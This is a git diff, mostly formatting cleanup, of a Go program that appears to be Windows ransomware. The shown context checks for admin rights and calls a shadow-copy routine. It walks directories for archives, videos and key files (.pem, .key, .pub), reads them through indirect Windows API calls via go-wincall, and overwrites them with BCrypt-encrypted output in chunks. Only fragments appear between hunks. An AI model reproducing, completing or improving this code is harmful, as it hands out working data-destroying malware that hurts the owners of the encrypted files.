@@ -5,21 +5,21 @@ package main
 
 import (
 	"crypto/rand"
+	"encoding/hex"
+	"flag"
 	"fmt"
 	"strings"
-	"unsafe"
-	"encoding/hex"
 	"unicode/utf16"
+	"unsafe"
+
 	wc "github.com/carved4/go-wincall"
-	"flag"
 )
 
 func main() {
 	var path = flag.String("path", "", "-path <C://path//path>")
 	flag.Parse()
 	if CheckAdmin() {
-		res := VssCopies()
-		fmt.Printf("result %s\n", res)
+		VssCopies()
 	}
 
 	key := keygen()
@@ -50,11 +50,11 @@ func getPaths(rootDir string) []string {
 		".zip":    true,
 		".tar":    true,
 		".mp4":    true,
-		".tar.gz": true, 
-		".bin": true, 
-		".pem": true, 
-		".key": true, 
-		".pub": true, 
+		".tar.gz": true,
+		".bin":    true,
+		".pem":    true,
+		".key":    true,
+		".pub":    true,
 	}
 
 	var walkDir func(string)
@@ -131,8 +131,8 @@ func readFile(path string) []byte {
 	fHandle, _, _ := wc.CallG0(
 		createFileAddr,
 		utf16Path,
-		0x80000000, // GENERIC_READ
-		0x00000001 | 0x00000002, // FILE_SHARE_READ | FILE_SHARE_WRITE
+		0x80000000,            // GENERIC_READ
+		0x00000001|0x00000002, // FILE_SHARE_READ | FILE_SHARE_WRITE
 		0,
 		3,          // OPEN_EXISTING
 		0x08000080, // FILE_FLAG_SEQUENTIAL_SCAN | FILE_ATTRIBUTE_NORMAL
@@ -160,31 +160,30 @@ func readFile(path string) []byte {
 		fmt.Printf("file is empty\n")
 		return nil
 	}
-	
+
 	fmt.Printf("Reading file (size: %d bytes, %.2f MB)\n", fSize, float64(fSize)/(1024*1024))
-	
-	const maxFileSize = 2 * 1024 * 1024 * 1024 
+
+	const maxFileSize = 2 * 1024 * 1024 * 1024
 	if fSize > maxFileSize {
 		fmt.Printf("file too large: %d bytes (max %d bytes)\n", fSize, maxFileSize)
 		return nil
 	}
-	
+
 	buffer := make([]byte, fSize)
-	
 
 	const maxReadSize = 64 * 1024 * 1024
 	var totalBytesRead uint64 = 0
 	var overlapped uintptr = 0
-	
+
 	for totalBytesRead < fSize {
 		remaining := fSize - totalBytesRead
 		readSize := uint32(maxReadSize)
 		if uint64(readSize) > remaining {
 			readSize = uint32(remaining)
 		}
-		
+
 		fmt.Printf("Attempting to read %d bytes at offset %d...\n", readSize, totalBytesRead)
-		
+
 		var bytesRead uint32
 		ret, _, _ := wc.CallG0(
 			readFileAddr,
@@ -194,27 +193,27 @@ func readFile(path string) []byte {
 			uintptr(unsafe.Pointer(&bytesRead)),
 			overlapped,
 		)
-		
+
 		fmt.Printf("ReadFile returned: ret=%d, bytesRead=%d\n", ret, bytesRead)
-		
+
 		if ret == 0 {
 			err, _, _ := wc.CallG0(getLastErrorAddr)
 			fmt.Printf("ReadFile failed at offset %d: err=0x%x\n", totalBytesRead, err)
 			return nil
 		}
-		
+
 		if bytesRead == 0 {
 			err, _, _ := wc.CallG0(getLastErrorAddr)
 			fmt.Printf("ReadFile returned 0 bytes at offset %d (expected %d more bytes), last error: 0x%x\n", totalBytesRead, remaining, err)
 			return nil
 		}
-		
+
 		totalBytesRead += uint64(bytesRead)
 		fmt.Printf("Read %d bytes, total so far: %d / %d\n", bytesRead, totalBytesRead, fSize)
 	}
-	
+
 	fmt.Printf("Successfully read %d bytes\n", totalBytesRead)
-	
+
 	return buffer
 }
 
@@ -318,7 +317,7 @@ func encryptFile(filePath string, key []byte) error {
 	}
 	if len(pbInput) == 0 {
 		fmt.Printf("Skipping empty file: %s\n", filePath)
-		return nil 
+		return nil
 	}
 	defer func() {
 		for i := range pbInput {
@@ -331,11 +330,11 @@ func encryptFile(filePath string, key []byte) error {
 
 	pbIVForFile := make([]byte, cbBlockLen)
 	copy(pbIVForFile, pbIVOriginal)
-	
+
 	if len(pbInput) <= chunkSize {
 		pbIVCopy := make([]byte, cbBlockLen)
 		copy(pbIVCopy, pbIV)
-		
+
 		var cbOutput uint32
 		ret, _, _ = wc.CallG0(
 			bCryptEncrypt,
@@ -356,7 +355,7 @@ func encryptFile(filePath string, key []byte) error {
 		if cbOutput == 0 {
 			return fmt.Errorf("BCryptEncrypt returned 0 output size")
 		}
-		
+
 		pbOutput := make([]byte, cbOutput)
 
 		ret, _, _ = wc.CallG0(
@@ -375,7 +374,6 @@ func encryptFile(filePath string, key []byte) error {
 		if ret != 0 {
 			return fmt.Errorf("BCryptEncrypt failed: 0x%x", ret)
 		}
-		
 
 		utf16Path, _ := wc.UTF16ptr(filePath)
 		fHandle, _, _ := wc.CallG0(
@@ -392,7 +390,6 @@ func encryptFile(filePath string, key []byte) error {
 			return fmt.Errorf("failed to open file for writing")
 		}
 		defer wc.CallG0(closeHandleAddr, fHandle)
-
 
 		var bytesWritten uint32
 		ret, _, _ = wc.CallG0(
@@ -424,27 +421,27 @@ func encryptFile(filePath string, key []byte) error {
 
 	var allOutput []byte
 	offset := 0
-	
+
 	for offset < len(pbInput) {
 		remainingSize := len(pbInput) - offset
 		currentChunkSize := chunkSize
 		isLastChunk := false
-		
+
 		if remainingSize <= chunkSize {
 			currentChunkSize = remainingSize
 			isLastChunk = true
 		}
-		
+
 		chunk := pbInput[offset : offset+currentChunkSize]
 
 		var flags uintptr = 0
 		if isLastChunk {
 			flags = BCRYPT_BLOCK_PADDING
 		}
-		
+
 		pbIVCopy := make([]byte, cbBlockLen)
 		copy(pbIVCopy, pbIV)
-		
+
 		var cbOutput uint32
 		ret, _, _ = wc.CallG0(
 			bCryptEncrypt,
@@ -465,9 +462,9 @@ func encryptFile(filePath string, key []byte) error {
 		if cbOutput == 0 {
 			return fmt.Errorf("BCryptEncrypt returned 0 output size for chunk at offset %d", offset)
 		}
-		
+
 		pbOutput := make([]byte, cbOutput)
-		
+
 		ret, _, _ = wc.CallG0(
 			bCryptEncrypt,
 			uintptr(hKey),
@@ -484,14 +481,13 @@ func encryptFile(filePath string, key []byte) error {
 		if ret != 0 {
 			return fmt.Errorf("BCryptEncrypt failed on chunk at offset %d: 0x%x", offset, ret)
 		}
-		
+
 		allOutput = append(allOutput, pbOutput[:cbData]...)
-		
 
 		for i := range pbOutput {
 			pbOutput[i] = 0
 		}
-		
+
 		offset += currentChunkSize
 	}
 
